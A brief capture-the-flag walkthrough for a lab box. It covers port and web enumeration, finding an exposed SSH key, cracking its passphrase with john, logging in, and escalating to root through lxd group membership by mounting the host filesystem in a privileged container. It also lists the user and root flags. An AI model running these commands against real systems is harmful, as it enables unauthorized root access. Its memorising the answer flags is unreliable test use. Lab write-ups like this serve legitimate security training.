<pre>
Machine IP: 10.10.105.32

Enum:
    Open ports:
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 
| ssh-hostkey:
|   2048 34:0e:fe:06:12:67:3e:a4:eb:ab:7a:c4:81:6d:fe:a9 (RSA)
|   256 49:61:1e:f4:52:6e:7b:29:98:db:30:2d:16:ed:f4:8b (ECDSA)
|_  256 b8:60:c4:5b:b7:b2:d0:23:a0:c7:56:59:5c:63:1e:c4 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: House of danak


Enum port 80: gobuster
    /uploads (Status: 301)
        dict.lst    -> dict for cracking maybe secretKey
manifesto.txt     
    meme.jpg
/secret (Status: 301)
    secretKey => Found a ssh key
        Copy ssh key in your attacking machine


Crack secretKey:
    $ python ssh2john.py id_rsa > id_hash
    $ john --wordlist=/root/Documents/wordlists/rockyou.txt id_hash
    =>Creds:    letmein          (id_rsa)

Login via ssh:
    $ ssh -i id_rsa john@10.10.105.32
        $pwd letmein
And got user flag.

Priv Esc enum: linpeas.sh
    uid=1000(john) gid=1000(john) groups=1000(john),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)

    27(sudo) => vuln to priv esc
    108(lxd) => vuln to priv esc

Let exploit it:

Attacker box:
    $ git clone https://github.com/saghul/lxd-alpine-builder
    $ cd ***
    $ ./build-alpine -a i686

    $ ls
Alpine-v3.12-i686-20201118_0812.tar.gz

Download the file in ctf box with python http.server

CTF box:
    $ lxc image import ./alpine-v3.12-i686-20201118_0812.tar.gz --alias myimage
    $ lxc init myimage mycontainer -c security.privileged=true
    $ lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
    $ lxc start mycontainer
    $ lxc exec mycontainer /bin/sh

    ~ # id
uid=0(root) gid=0(root)
    
    ~ # cat /mnt/root/root/root.txt
        2e337b8c9f3aff0c2b3e8d4e6a7c88fc


User Flag: a5c2ff8b9c2e3d4fe9d4ff2f1a5a6e7e
Root Flag: 2e337b8c9f3aff0c2b3e8d4e6a7c88fc
</pre>
